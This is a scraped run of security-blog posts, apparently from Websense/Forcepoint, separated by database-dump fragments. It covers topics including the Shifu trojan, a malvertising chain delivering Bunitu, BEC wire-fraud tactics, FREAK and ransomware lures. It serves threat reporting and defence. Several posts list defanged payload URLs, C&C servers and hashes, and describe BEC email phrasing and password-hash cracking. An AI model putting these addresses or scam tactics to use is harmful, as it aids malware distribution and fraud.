Unfortunately, the availability of skilled cyber security workers isn’t keeping up with ongoing and future necessity.\n\nA January 2015 survey conducted by ISACA, a nonprofit, global association (previously the Information Systems Audit and Control Association), found that among thousands of its members in multiple countries, 86 percent cited a global shortage of skilled cybersecurity professionals with more than 90 percent expecting to have difficulty finding am adequately skilled candidate for open positions.  The International Information System Security Certification Consortium, Inc., (ISC)²®, followed this with an April 2015 industry study forecasting a staff shortage of 1.5 million cyber securityworkers in the industry by 2020.\n\nNew research by Raytheon indicates the situation may get worse before it gets better. The Raytheon annual study,Securing Our Future: Closing the Cyber Talent Gap indicates a global disinterest among young adults in pursuing cybersecurity careers as well as a widening gender gap.\n\nThough there exists a growing recognition of the importance of and need for cyber security, millennials are often unaware of the many benefits of a cyber-career – chief among them high pay. And with more than half of both men and women in the U.S. receiving little to no job counseling on potential careers in cyber or access to applicable computer skills classes prior to and in high school to inspire interest in the field, we may find ourselves in a future unable to adequately keep the Internet safe.\n\nIt’s not all bad news, however. Raytheon’s study found young adults were more likely to choose a career that helps to make the Internet safer than a year ago, while just under 40 percent are interested in learning about cybersecurity or taking classes.\n\nThe Internet is here to stay and with it the need for innovative cyber security technology and skilled personnel.  It will take businesses, government and education systems working in tandem to create the next generation of cyber professionals to secure our technological future.\n\nRead the full report here or visit the links below:\n\nCyber Help Wanted\n\nNational Collegiate Cyber Defense Competition', 'https://www.forcepoint.com/blog/insights/mind-gap-securing-future-cyber-talent\n');

Websites, apps and electronic devices may make daily life and doing business more than convenient than ever, but their use and popularity also means a massive amount of confidential data deeply embedded within the wider web. The more we use the Internet, and the devices that connect to it, the more that information proliferates. This is especially true for the finance and healthcare sectors.\n\nDigital and connected diagnostic and screening systems in the healthcare field are expected to reach more than 40 percent global penetration by 2020. Connected medical devices are invaluable to medical facilities, staff and patients in advancing overall progress and care, but have the potential to affect information systems that protect patient safety and data. In a climate where up to 75 percent of hospital network traffic goes unmonitored, it’s important to plan for security BEFORE something is online and connected.\n\nLikewise, the requirement of those in the financial services industry to maintain their real-time connection to the global economy can impair certain logical security precautions. For instance, eliminating a known vulnerability in one bank’s system can break necessary continuity with banks that have not yet upgraded their own. With valuable financial and sensitive personal information of millions of consumers on hand, businesses in finance must continually strengthen their security practices for effective defense and remediation efforts.\n\nWith the Internet of Things predicted to approach tens of billions of connected objects  by the year 2020, IT leaders will need to adapt their risk and security approach in tandem to meet the speed of technology.\n\nFor the latest on how to negotiate the Internet of Things and more, visit Raytheon|Websense Resources.', 'https://www.forcepoint.com/blog/insights/finding-security-among-internet-things\n');

However, if no MiTM interception was detected (even if previous requests were) and if it was able to connect through to one of these hosts, then it proceeded to contact its C&amp;C as normal:</p>\n<p>\n	<img alt=\"\" src=\"/sites/default/files/blog/legacy/4456.shifu_cnc_post.png-550x0.png\" style=\"height:67px; width:550px\" /></p>\n<p>\n	This is not typical malware behavior that we tend to see, because a significantly large percentage of organizations do, in fact,&nbsp;employ MiTM interception for HTTPS in order to detect and stop more threats, meaning that Shifu would refuse to attempt a communication with its C&amp;C or domain generation algorithm (DGA) infrastructure in such a scenario.&nbsp;</p>\n<p>\n	Blog contributors: Nick Griffin, Ran Mosessco, Andy Settle</p>\n<h2>\n	Indicators of Compromise (IOCs)</h2>\n<p>\n	Attachment hashes (SHA1):</p>\n<p>\n	<em>27eebb467c0caf35aea15d4a26c865c203426596</em></p>\n<p>\n	<em>7768683584cd0a71d02b89896322099405173fa9</em></p>\n<p>\n	<em>fa71d6430165d810a6ac9d9199d88620534b14e8</em></p>\n<p>\n	<strong>Payload URLs:</strong></p>\n<p>\n	<em>hxxp://www.profes-decin.kvalitne[.]cz/345gfc334/65g3f4.exe</em></p>\n<p>\n	<em>hxxp://rockron[.]com/~rockron/345gfc334/65g3f4.exe</em></p>\n<p>\n	<em>hxxp://leelazarow[.]com/345gfc334/65g3f4.exe</em></p>\n<p>\n	<strong>Shifu payload hash (SHA1):</strong></p>\n<p>\n	<em>476c8baa551fc5d1d9aad5441c7d1c2c4d502944</em></p>\n<p>\n	<strong>Shifu command-and-control (C&amp;C) server:</strong></p>\n<p>\n	<em>hxxps://freewebpj[.]com/news/userlogin.php</em></p>', 'https://www.forcepoint.com/blog/security-labs/japanese-banking-trojan-shifu-distributed-malicious-word-documents\n');

Managing a compromised location could be a niche space for some opportunistic cyber malefactors, who could leverage distribution channels to others within the same shady circle for profit.

Even if they have both the latest technology and best  IT professionals in the business to protect against cyber threats, a company is still vulnerable to breaches if they’re not also educating their employees on not only which data is important to protect , but why.  \n\nThough many companies have IT policies in place that employees are expected to follow, they are often broad, referring to protecting a catch-all term of “confidential” data, without attempting to explain which data matters and what losing that data might mean for the business.\n\nThe proliferation of employees using their own smart phones, laptops and tablets to access company data, further complicates risk. Without the ability to secure and monitor network traffic as they normally would, IT must rely on employees to act responsibly when accessing, transmitting or storing company data on these devices. Arming employees with information they can transform into practicable behavior is key to ensuring that, whether on company premises, at home or on the go, company AND personal devices are used mindfully.\n\nHere are just a few things to consider when educating employees on data security:\n\n         Not all data is equal\nSome data may not require the same security controls as others. Employees should be made aware why data with personally identifiable information (PII) or internal company information -  financial records, and intellectual property, for instance - should be treated with more care as the impact to the company , both from a reputational and economic impact should they be lost , is very high.\n\n         Not everyone is who they appear to be\nSpear phishing is a planned and executed attack against a specific organization. A credible, often urgent looking email that appears to be from an authorized person in the company - such as IT or HR - or from an outside vendor concerning billing or an invoice, is sent to employees with a link to a web page or attachment that looks authentic, but is actually malicious.\n\nEducate employees to beware of email marked urgent,  look at the address to see where the email is coming from, be leery of links, especially if the e-mail requests sensitive information or PII,  and check that URLs contained in the email makes sense (websense.com vs. websensse.com. for example).\n\n·         If you’re not sure, ask!\n\nMake sure employees know it’s ALWAYS OK to ask whether an email is safe or not.  \n\nFor more education on cyber treats, visit Raytheon|Websense Resources.', 'https://www.forcepoint.com/blog/insights/putting-cyber-security-work-work\n');

Today, Raytheon|Websense® Security Labs™ experts, using real-world data gathered from billions of email and web events identified by its global threat intelligence network, released its second* industry report, this time offering new and timely insight crucial to protecting healthcare organizations - and the individuals who use their services - from the security exploits and vulnerabilities impacting them today.\n\n\n	Key findings from the report reveal the healthcare industry is highly-targeted and increasingly vulnerable to attack, with340 percent more security incidents and attacks than the average industry and more than 200 percent more likely to encounter data theft. One in every 600 attacks in the healthcare sector also involves advanced malware, yet – as detailed in the report - many healthcare organizations lack the administrative, technical, or organizational skills necessary to detect, mitigate and prevent cyberattacks. Even as CIOs emphasize IT as critical to helping achieve patient care goals, an overwhelming majority are stymied by a lack of budget and resources.\n\n\n	The absence of a comprehensive healthcare IT strategy leaves the industry open to the considerable consequences resulting from data loss in the form of external attacks, employee negligence and the insider threat. Digital and connected diagnostic and screening systems, expected to reach more than 40 percent global penetration by 2020, add another layer of complexity. Raytheon|Websense experts estimate that up to 75 percent of hospital network traffic goes unmonitored by security solutions out of fear that improperly configured security measures or alarming false positives could dramatically increase the risk to patient health or well-being.\n\n\n	As healthcare becomes more digitally connected than ever before, it’s crucial that its practitioners and executives know how to protect their organizations and the individuals who use their services. Better, ongoing security training for employees as well as a thorough understanding of the specific and evolving cyber threats affecting their organizations and how to defend against them is the only way to counter breaches and the high cost of remediation.\n\n\n	To learn more about what’s ailing healthcare IT security and potential remedies, click here.\n\n\n	*The first report, on the Financial Services Industry, can be found here.', 'https://www.forcepoint.com/blog/insights/raytheonwebsense-diagnoses-state-healthcare-it-security\n');

Since then, these fraudulent attacks have continued, logging immense gains in both volume and success: the FBI&rsquo;s Internet Crime Complaint Center (IC3) reports a&nbsp;<a href=\"http://www.ic3.gov/media/2015/150827-1.aspx\" target=\"_blank\">270% increase</a>&nbsp;in identified victims and dollar losses since January. Since 2013, reported American losses to the scam identified as the Business Email Compromise (BEC) have totaled in excess of $740 million; non-U.S. victims have lost more than $51 million.</p>\n<h3>\n	Typo-squatting: Key tactic</h3>\n<p>\n	Websense Security Labs has identified some key features of these aggressive fraud campaigns, one of which is the use of recently registered domains with the Internet Corporation for Assigned Names and Numbers (ICANN) by a known bad actor. Research indicates that these domains, which often have only one character&rsquo;s difference to the target domain, or feature transposed characters, are exploited within hours of registration.</p>\n<h3>\n	Rapidity: Delude, Conclude, and Elude</h3>\n<p>\n	From start to finish, these money scams are completed in less than a week. Throughout the attack, especially if the bait gets a nibble in the form of a first response, the recipient may receive several urgent requests for an update and promises of details and instructions to come. If the bait is taken, the entire money transfer can be completed in 1-2 days. By the time the victim has second thoughts about the validity of the request, the bad actor has disappeared, leaving&nbsp;very little in terms of a traceable footprint.</p>\n<h3>\n	Where Does the Money Go?</h3>\n<p>\n	According the IC3, the money trail takes several hops around the world, but&nbsp;<a href=\"https://www.ic3.gov/media/2015/150122.aspx\" target=\"_blank\">primarily ends up in Asian banks</a>&nbsp;(specifically mainland China and Hong Kong).</p>\n<h3>\n	Who Is the Target?</h3>\n<p>\n	In the early days of this highly successful scam, businesses in the financial and gaming sectors were the most frequent marks. Businesses in these industries regularly transfer money, often by wire and typically in large sums, and an irregular request, even one for a substantial amount, would not raise concern. More recently, the scam has broadened its reach, attacking other verticals and businesses of all sizes. In a sign of the growing audacity of fraud attacks, even security firms such as Websense and Raytheon have been targeted. Websense analytics recognized and thwarted the attempts.</p>\n<p>\n	<img alt=\"\" src=\"/sites/default/files/blog/legacy/6457.graphic_001.png-550x0.png\" style=\"height:86px; width:550px\" /></p>\n<h3>\n	Familiarity Breeds&hellip; Huge Windfalls</h3>\n<p>\n	These attacks are well-researched. Factual information and email addresses, easily gleaned from &lsquo;about&rsquo; pages on websites, SEC-related documents, or other sources, are incorporated to bolster credibility.</p>\n<p>\n	The fraudulent emails typically appear to be from the CEO and are usually sent to the email account of the CFO or another person with the authority to initiate and authorize a wire transfer. The emails&nbsp;address the recipient by name and may include a footer featuring the impersonated executive&rsquo;s (accurate) information. Informality and familiarity are used to allay suspicions and induce cooperation, and the FBI&rsquo;s data indicates that the&nbsp;strategy is working.</p>\n<h3>\n	Deceptive Ploy</h3>\n<p>\n	There have recently been three types of scams, structurally speaking.&nbsp;</p>\n<ul>\n	<li>\n		- The first is&nbsp;a typo-squatted domain, which relies on simple misidentification &ndash; the domain is so similar, the difference isn&rsquo;t noticed. In this case, the envelope sender and reply-to address (if there is one) will be the typo-squatted domain.&nbsp;</li>\n	<li>\n		- The second uses the recipient&rsquo;s domain as a forged From address in the display headers, but the envelope sender is a completely different address, probably a compromised account, and the reply-to address is a freemail address.&nbsp;</li>\n	<li>\n		- The third involves a spoofed envelope sender, making it much more difficult to spot the email as a fraud. However, as with the others, the reply-to address is completely different.</li>\n</ul>\n<h3>\n	Format and Style</h3>\n<p>\n	The emails are short on content, only a couple of sentences long. They are direct, succinct, and authoritative in tone. They command while simultaneously asserting familiarity. The emails do not include links or images. Subject lines are nondescript and to the point; frequently used subjects include Request, Wire Request, Wire Transfer, Chaps payment, or similar.</p>\n<p>\n	Typically, the messages will begin with, &ldquo;[Name], are you in the office?&rdquo; or with a common expression of goodwill (&ldquo;Hope your day is going well&rdquo;). This is followed by a stated, urgent need to start a wire transfer or Chaps payment (UK). The sender may also assert that:&nbsp;</p>\n<ul>\n	<li>\n		-&nbsp;they are unable to provide more information at the moment, but will provide it soon - a deal may fall through if the transfer is not started immediately -&nbsp;they are indisposed and can&rsquo;t do it themselves and need the recipient to begin the process&nbsp; -&nbsp;procedural steps&nbsp;should be bypassed or postponed <img alt=\"\" src=\"/sites/default/files/blog/legacy/0675.graphic_002.png-550x0.png\" style=\"height:104px; width:403px\" />\n		<h3>\n			How to Prevent this Fraud from Happening to Your Company</h3>\n		<p>\n			There are a number of ways to ensure your company does not fall victim to this costly scam.</p>\n		<h3>\n			Awareness/Education</h3>\n		<p>\n			Diligence and caution remain among the most powerful tools in any company&rsquo;s arsenal.</p>\n		-&nbsp;Make sure employees are aware of this and other common scams and their hallmarks.\n		<p>\n			-&nbsp;Ensure that those with the authority to fast-track transfers and payments and/or bypass protocol are aware that they are likely to be approached.&nbsp;</p>\n		-&nbsp;Establish a protocol for confirmation/verification before transferring money that includes out-of-band methods.&nbsp; -&nbsp;All non-commercial email from a source outside the company will include a link to report the email to Websense as spam.\n		<p>\n			Websense email security customers are protected against attacks using such tactics.</p>\n		<p>\n			Websense is committed to email security and constantly monitors traffic and trends to identify threats and improve detection and protection for our customers.&nbsp;</p>\n		<p>\n			Primary contributor: Cristina Houle</p>\n	</li>\n</ul>', 'https://www.forcepoint.com/blog/security-labs/typo-squatting-fast-turnaround-fast-money\n');

On one end of the spectrum are mass infections and threats that, while not very sophisticated, cast a wide net. On the other hand, we have very advanced targeted threats that are crafted painstakingly with a single target in mind, and executed over multiple stages possibly over a long period of time. Whatever the type of attack, it is clear that&nbsp;<a href=\"http://www.websense.com/content/websense-2015-threat-report.aspx\" target=\"_blank\">cybercrime is a business</a>,&nbsp;and attackers are utilizing all marketing concepts like segmentation and targeting to zone in on their victims of interest. &nbsp;</p>\n<p>\n	Just like other aspects of the web are dynamic and targeted to you, such as your location, browser type, and browsing history, to maximize the chances of being relevant to you, malware&nbsp;targets its victims using multiple factors.&nbsp;It doesn&rsquo;t have to be custom crafted or targeted at a single entity, but can be targeted automatically at dynamic subgroups&mdash;for example, specific industries, and geographies.</p>\n<p>\n	The industry (sector) and nature of business play a key role in the type of threats malware uses to target its victims. Using<a href=\"http://community.websense.com/blogs/securitylabs/archive/2015/04/27/Char... target=\"_blank\">Threat Galaxies</a>&nbsp;to cluster a variety of indicators across diverse threat channels, we found some very interesting behavior. As we clustered our telemetry data gathered via our Websense&reg; ThreatSeeker&reg; Network and the&nbsp;<a href=\"https://www.websense.com/content/websense-advanced-classification-engine... target=\"_blank\">Websense Advanced Classification Engine</a>&nbsp;&nbsp;by type of threat, we saw a thick cluster of injection in every high level Threat Galaxy. Injection is a generic term for a class of attacks that rely on injecting data into web applications in order to facilitate the execution or interpretation of malicious data in an unexpected manner. It falls into the&nbsp;<a href=\"http://www.websense.com/content/seven-stages-lure.aspx\" target=\"_blank\">lure</a>&nbsp;stage of the attack kill chain.</p>\n<p>\n	To illustrate how attacks are targeted by industry (or sector), let&rsquo;s take a journey into our latest Threat Galaxy, (shown below) that encompasses all industries and threats. Specifically as a case study, the dominant green cluster represents compromised websites that have been injected with malicious elements.</p>\n<p>\n	<img alt=\"\" src=\"/sites/default/files/blog/legacy/8666.pic1.png-550x0.png\" style=\"height:551px; width:550px\" /></p>\n<p>\n	Isolating the education sector by coloring it in the same color as injection in the second graph below, we see that the majority of the users that visited compromised websites (colored green in the first graph) are from the education sector.</p>\n<p>\n	<img alt=\"\" src=\"/sites/default/files/blog/legacy/6607.pic2.png-550x0.png\" style=\"height:550px; width:550px\" /></p>\n<p>\n	Clearly, users in the education sector are more likely to visit compromised websites. Additionally,&nbsp;according to&nbsp;our study based on the large sample set, users in the education sector are:</p>\n<ul>\n	<li>\n		20 times more likely to encounter websites impacted by BlackHat SEO than any other sector.&nbsp;</li>\n	<li>\n		Twice as likely to visit malicious websites.</li>\n	<li>\n		Twice as likely to be impacted by Spyware / Adware.</li>\n</ul>\n<div>\n	&nbsp;</div>\n<p>\n	Another interesting point to note from the sample set study is that although users from the education sector display more risky behavior in terms of visiting compromised websites, some threats are less likely to descend further down the attack kill chain for these users. A specific case that illustrates that different threats affect different industries is highlighted in our Websense Security Labs&trade;&nbsp;<a href=\"http://www.websense.com/content/2015-finance-industry-drilldown.aspx\" target=\"_blank\">2015 Financial Services Drill-Down report</a>&nbsp;where we found that the Financial Services sector sees 400 percent more attacks using Geodo than other industries see.

Clearly this behavior also affects the threats they are impacted by. All traffic is not created equal&mdash;certainly not to attack infrastructure. There are multiple factors that have a role to play in terms of which threats impact which victim, and the data shows that the company you keep does matter in how likely you are to have your valuable assets breached by a threat.

It allows businesses to host and manage their own advertising services rather than relying on third party services, and it is common for multiple websites to use the same Revive Adserver script.</p>\n<p>We have seen compromised Revive Adserver scripts used in malvertising&nbsp;<a href=\"http://blogs.websense.com/security-labs/dissecting-cleartripcom-website-... target=\"_blank\">in the past</a>, and seemingly this continues to be a target of interest for cybercriminals.</p>\n<p><strong>Note</strong>: To clarify, OpenX (www.openx.com) is an enterprise software company which in 2013 sold OpenX Source to Revive Adserver. Revive Adserver (www.revive-adserver.com) built a new open source project on the original OpenX Source. Neither OpenX (the company) nor Revive Adserver currently support OpenX Source software, but many instances of OpenX Source are still in use and vulnerable to this malvertising exploit.</p>\n<h3>Angler Exploit Kit Strikes Again</h3>\n<p>The code injected into the compromised Revive Adserver scripts in this campaign have been seen to lead to the very prevalent Angler Exploit Kit.&nbsp;The injected code is not always sent when the script is requested, making it difficult to detect with automated analysis tools. In addition, Angler Exploit Kit will only serve up the malicious exploit code once per IP in a 24 hour period or so.</p>\n<p>Since April we have seen compromised Revive Adserver scripts being used by several highly popular websites, including CNN Indonesia, Detik, Prague Airport, AASTOCKS, RTL Television Croatia, and the official Bejewled Blitz game on Facebook. Some of these only seem to contain the injected code for 24 hours, whilst others have remained compromised for weeks. Recently, we saw an interesting infection chain from the popular Croatian website&nbsp;<em>Forum[.]hr</em>&nbsp;(Alexa 15 in Croatia) which has been using a compromised Revive Adserver script from third-party advertiser&nbsp;<em>ads3.monitor[.]hr</em></p>\n<p><img alt=\"\" src=\"/sites/default/files/blog/legacy/security-labs/7sm5jqt.png\" style=\"height:670px; width:1003px\" /></p>\n<p><img alt=\"\" src=\"/sites/default/files/blog/legacy/security-labs/w2mmvo9.png\" style=\"height:427px; width:1106px\" /></p>\n<p><em>Image 2, 3 &amp; 4.&nbsp;</em><em>A compromised advertizing script on&nbsp;ads3.monitor[.]hr&nbsp;displays a legitimate advert whilst malicious code executes in the background</em></p>\n<p>The injected code led to a redirect, and then to Angler Exploit Kit which exploited the latest Adobe Flash Player vulnerability (CVE-2015-3090). Recently the exploit kit has been distributing CryptoWall 3.0, Bedep and Necurs but we saw a different payload, a trojan known as &#39;Bunitu&#39;.</p>\n<h3>Bunitu Malware Turns Your Machine into a Zombie</h3>\n<p>The Bunitu malware dropped by Angler caused our infected machine to act as a proxy, in theory allowing our computer&#39;s network connection to be used for subsequent malicious activity. Cybercriminals often use this tactic in order to hide their tracks from authorities, behind legitimate users&#39; machines. The SHA1 for the sample we saw is&nbsp;<em>004e9a3ea2670a76ee90067ff29816c31908e552</em>.</p>\n<p>Bunitu drops and loads a DLL within its own process which opens two random ports on the infected machine for a SOCKS5 proxy and an HTTP proxy, and in our case these were ports 8322 &amp; 56100 respectively. It contains a hard-coded call home/command-and-control IP of&nbsp;<em>85.17.142[.]21:53</em>&nbsp;which it tries to contact twice in order to report our infection and which ports it has opened on our machine:</p>\n<p><img alt=\"\" src=\"/sites/default/files/blog/legacy/security-labs/zi84cmm.png\" style=\"height:317px; width:1141px\" /></p>\n<p><em>Image 5. Bunitu calling home and reporting an infection, along with which proxy ports are opened on the infected machine</em></p>\n<p>The malware also has back-up infrastructure in case the hard-coded call home server is not available. It attempts to resolve&nbsp;<em>nsb.quixjoumnf[.]com</em>, resulting in an IP of&nbsp;<em>110.201.214[.]114</em>. The hexadecimal value of this IP address is represented in memory as 0x72D6C96E, and Bunitu then XORs this value against a hard-coded value of 0x16EC1A31, resulting in 0x643AD35F. This final value is the hexadecimal representation of another IP,&nbsp;<em>95.211.58[.]100</em>&nbsp;which is used as a call home by Bunitu after the initial two attempts to the hard-coded server. This routine can be seen in the following image:</p>\n<p><img alt=\"\" src=\"/sites/default/files/blog/legacy/security-labs/ftj4ufi.png\" style=\"height:596px; width:1013px\" /></p>\n<p><em>Image 6. Bunitu XOR routine for resolving IP addresses</em></p>\n<p>There are also two more back-up addresses that Bunitu can resolve if&nbsp;<em>nsb.quixjoumnf[.]com</em>&nbsp;does not resolve; here is a representation of how the call home infrastructure is determined:</p>\n<p><img alt=\"\" src=\"/sites/default/files/blog/legacy/security-labs/xjbgorj.png\" style=\"height:86px; width:812px\" /></p>\n<p>Bunitu regularly sends heartbeats to its C&amp;C so that it can be determined which machines are currently active and infected.</p>\n<h3>Summary</h3>\n<p>Advertising networks continue to be a point of focus for cybercriminals, opening up avenues to infect millions of users with minimal effort. The growing nature of evasion, stealth, and variation employed in the malicious code means that it&#39;s more important now than ever to deploy a security solution capable of stopping threats at multiple points in the&nbsp;<a href=\"http://www.websense.com/content/seven-stages-recon.aspx?cmpid=slbl\" target=\"_blank\">7 stages kill chain</a>.</p>\n<h3>Appendix</h3>\n<p>Indicators of compromise can be found below.</p>\n<p><strong>Payloads (SHA1)</strong></p>\n<p>SWF Exploit: <em>feb33f3a3ac53203697d2b04ddbefa038b199a21</em></p>\n<p>Bunitu EXE:&nbsp; <em>004e9a3ea2670a76ee90067ff29816c31908e552</em></p>\n<p>Bunitu DLL:&nbsp; <em>fc512fc9ad3501aecf8fab06d2c76447879520d0</em></p>\n<p><strong>Command-and-Control</strong></p>\n<p><em>nsb.quixjoumnf[.]com</em></p>\n<p><em>ns1</em><em>.quixjoumnf[.]com</em></p>\n<p><em>ns0</em><em>.quixjoumnf[.]com</em></p>\n<p><em>85.17.142[.]21:53</em></p>\n<p><em>95.211.58[.]100:53</em></p>\n<p><em>95.211.233[.]121:53</em></p>\n<p><em>46.183.216[.]247:53</em></p>', 'https://www.forcepoint.com/blog/security-labs/large-malvertising-campaign-leads-angler-ek-bunitu-malware\n');

In general, the previous stages help the attacker reach their objective. Attackers are known to go to great lengths to cover their tracks in order to reach this stage. In some cases, attackers have been known to lurk in the network for months or years before exfiltrating large quantities of data. Attackers are definitely getting craftier and more sophisticated. Also, when it comes to insider threats, the first six stages of the attack kill chain could be optional because the privileged malicious insider already has some level of access in the environment.\n\n \n\nData theft can be for purposes of blackmail, espionage, economic gain, and more. The data that is stolen can be financial data (such as credit card numbers, bank account credentials), personal data that can further be used for profit (SSN, DOB, etc.), credentials, private keys and passwords, medical records, intellectual property (source code, trade secrets, etc.), the list goes on. Each data breach is different because the motives of the attackers vary. In general, unless the attacker failed at their objective or the objective is pure destruction, it is safe to say that some form of data theft can be assumed in a breach.\n\n \n\nAn interesting question is, where does all this stolen data end up? It could remain with the attacker perpetually, as would likely be the case with nation state attackers and other sophisticated attackers. However, vast amounts of data end up in the underground community for sale, or sometimes even in the public domain as an example of the loot.\n\n \n\nThe following example showcases a recent dump of personally identifiable information (PII) that includes names, addresses, phone numbers, dates of birth, and credit card numbers, along with their CVV and expiration dates.\n\n\n\nRemember the Sony Pictures Entertainment hack from last year? The attackers dumped hundreds of gigabytes of confidential data in the public domain, resulting in a great deal of financial and reputation loss. In addition, they also stole private keys . Private keys are highly sensitive and used in SSL / TLS, SSH, and other encrypted connections used for secure communication. There are different kinds of private keys, for example PuTTY .ppk keys and PKCS #12 files.\n\n\n\n\nAn excerpt from the list of files stolen from Sony Pictures Entertainment in the November 2014 hack, showing the .ppk private key files\n\n \n\nIf that\'s not scary enough, credentials are always valuable to an intruder either to gain additional access or for financial gain. In Linux, the basic files that store that information are the \"passwd\" and \"shadow\" files. Their equivalent in Windows is the SAM DB. All three files store usernames and hashed passwords in different but specific formats that allow a data security system to identify them as such using a regular expression.\n\n\n\nExample of a Security Account Manager (SAM) database file in a Windows systems that stores users\' passwords in a hashed format, either as a LM hash or as an NTLM hash\n\n \n\nOnce the hackers obtain hashed passwords, they can crack them using brute force or wordlists. Password cracking tools are available free online, in addition to tools such as \"John the Ripper\" and \"RainbowCrack,\" which generates rainbow tables.\n\n\n\nThe above example shows the output of a SAM file run through “John the Ripper”. The simple passwords such as “ROOT” and “1234” were broken in seconds. The administrator’s password was only partially broken because the run was stopped manually very quickly.\n\n \n\nMany other sensitive files that are not directly covered by regulations such as HIPAA or PCI are accessed and stolen by hackers. Configuration files and Process Information can also be very valuable to an attacker. Hence, being compliant does not mean that breaches will not occur. Rather, compliance is only a part of the risk mitigation process.\n\n \n\n \n\nData theft is the end-game of a lot of cyber-attacks. The data theft stage completes the attack kill chain. With insufficient security defenses, cybercriminals can steal intellectual property, PII, and other valuable data for financial gain and for use in other attacks. Yet even at this stage there are defenses to keep confidential data safe. Websense® TRITON® AP-DATA offers Data Loss Prevention (DLP) and Data Theft Prevention (DTP). A proper risk mitigation strategy, starting with identification of the assets to be protected combined with acceptance of the residual risk, goes a long way in raising the bar for the attackers. The payoff in the finale certainly looks attractive to the attackers and efforts to raise the bar will certainly help reduce the risk.\n\n\n \n\n \n\n\nPrimary contributor: Amit Nitzan\n\n\n\n\nOther: Sindyan Bakkal', 'https://www.forcepoint.com/blog/security-labs/what-does-payoff-finale-look\n');

We saw new techniques blended with the old, resulting in highly evasive attacks. While vulnerabilities were found and exploited in old infrastructure standards, developments such as the Internet of Things have emerged to present a completely new set of infrastructure challenges.\n\n\n	\n\n\n	There are eight trends definitely worth noting due to the significant risk they pose for data theft this year. These are reviewed across two categories: Human Behavioral Trends and Technique-based Trends, to examine who’s doing what and how they are doing it. Each of the two categories will look at 4 topics of interest, to include data on:\n\n\n	Cybercrime Just Got Easier: In this age of MaaS (Malware-as-a-Service), even entry-level threat actors can successfully create and launch data theft attacks due to greater access to exploit kits for rent, MaaS, and other opportunities to buy or subcontract portions of a complex, multi-stage attack. We review how 99.3 percent of malicious files used a Command & Control URL that has been previously used by one or more other malware samples and what this means for an attacker and a defender.\n\n\n	Something New or Déjà Vu?: Threat actors are blending old tactics, such as macros, in unwanted email with new evasion techniques. Old threats are being “recycled” into new threats launched through email and web channels, challenging the most robust defensive postures. We review how a business can adapt to protect itself from increasingly advanced threats and capable threat actors.\n\n\n	Digital Darwinism - Surviving Evolving Threats: Threat actors have focused on the quality of their attacks rather than quantity. Websense Security Labs observed 3.96 billion security threats in 2014, which was 5.1 percent less than 2013. Yet, the numerous breaches of high-profile organizations with huge security investments attest to the effectiveness of last year’s threats. We review what has changed in the threat landscape and what actions businesses can take to bolster their security posture.\n\n\n	Additional topics include how to face the challenge presented by the IT security skills shortage, how to build on infrastructure made brittle by OpenSSL Heartbleed and similar vulnerabilities, and how to handle the difficulties in correctly attributing an attack to an adversary.\n\n\n	Live Webcasts\n\n\n	We shall present our Threat Report 2015 in a series of webcasts, with key security experts discussing the past impact and future implications of these trends.

After Heartbleed, Poodle, and many other high-profile vulnerabilities comes FREAK (Factoring attack on RSA-EXPORT Keys), which at the time of publication of this blog breaks approximately 36% of all sites trusted by browsers as per this link including websites belonging to the NSA and FBI. About 12% of high-ranked Alexa websites are also believed to be vulnerable to the flaw at this time, thereby placing visitors to these sites at high risk.\n\nExposure and Impact\n\nThe vulnerability, discovered by Karthikeyan Bhargavan at INRIA in Paris and the mitLS team, allows an active attacker to perform a man-in-the-middle attack by downgrading the encrypted connection between a vulnerable client and a server that accepts export-grade RSA keys to 512-bits. The captured key can then be factored using the public cloud in a matter of hours and further be used for decryption of communication between the client and the server. Once the key has been compromised, all personal information, such as passwords and financial data, is at risk.\n\nThe origin of the vulnerability lies in the cryptographic export restrictions placed by the U.S. government in the 1990s. The restrictions have been eased since then, but the backdoor of weak encryption has lingered on in software. In the early 1990s, breaking 512-bit encryption required resources beyond the reach of the average attacker. Given the meteoric rise in computing power coupled with the rapid reduction in cost, breaking 512-bit encryption today is no longer considered daunting. Having cryptographic backdoors has backfired once again and has serious implications on the security of the Internet.\n\nVulnerable servers and clients are ones that either offer the RSA_EXPORT suite or use a version of OpenSSL that is vulnerable to CVE-2015-0204, the CVE identifier assigned to the SSL FREAK vulnerability.\n\nMitigation\n\nOpenSSL has issued a patch to address the vulnerability in January 2015. Several vendors are in the process of releasing patches for the vulnerability. We strongly recommend the application of patches as soon as they are available.\n\n\n\nWebsense® researchers are not aware of active exploitation of this vulnerability at the time of publication of the blog, although man-in-the-middle attacks are rather commonly used in targeted attacks on journalists and high-profile international visitors, as well as by opportunistic attackers.\n\nWebsense Security Labs™ will continue to monitor the situation and provide updates as needed.\n\nContributors: Rajiv Motwani, Cristina Houle, Tamas Rudnai', 'https://www.forcepoint.com/blog/security-labs/ssl-freakishly-long-existence\n');

The lure tend to be fake ‘eFax’ or ‘penalty’ download pages. \nThe Websense ThreatSeeker Intelligence Cloud identified a campaign sent yesterday to Australian end users.  This ransomware followed the 7 Stages of Advanced Threats model in a typical fashion.\n \nAustralian-themed Ransomware\nOur case study, the Australian-themed ransomware, exhibits the typical process from lure to infection.\nRansomware is most often distributed via email lures or compromised websites (specifically malvertising).  Today\'s case study used an initial email lure with a topic of penalties induced by speed cameras.  A typical subject is \"Penalty id number - <random number> / Fixed by speed camera\".\nThe lure email contains a URL (in this case a compromised wordpress host).  The end user is sent through to a website that makes a call to action:\n\n \nIn this case we see a Penalty Notice claiming to be from the New South Wales Office Of State Revenue.  For the avoidance of doubt the OSR is a legitimate organization and their website is hosted at http://www.osr.nsw.gov.au/.  Social Engineering is needed to convince the end user to perform an action. Note the use of a legitimate-looking logo as well as a CAPTCHA entry form to add a degree of legitimacy on the fraudulent website, and to encourage a further click action.  Hosts of the fraudalent website rotate, but include hxxp://nsw.gov.yourpenalty.com/ and hxxp://osr.nsw.mypenalty.org/  Similar variants on the theme will likely occur in the future.\nOnce the end user has been duped into clicking through, they are presented with a warning notice:\n\n \nDecrypt instructions are provided via an HTML document installed on the user\'s machine.  This points the user to yet another website where they are encouraged to perform a transaction:\n\n \nAs is typical, the decrypter service website offers two prices for decryption.  If the end user pays promptly they have to pay 2.4 bitcoins, (approximately) 499 USD.  If they pay after 3 days they would have to pay approximately 998 USD.\nA timer is shown to encourage urgent action.  The malicious website also reveals the number of files that have been encrypted.  Instructions are provided if the user is unsure how to trade in Bitcoins.\nAs before, we do not recommend paying the cyber-criminals to decrypt the files.  Success is not guaranteed.  If you fear you may have encountered a ransomware website (at any stage of the threat lifecycle) you can check our view on that by submitting the site to our online CyberSecurity Intelligence website analysis tool at 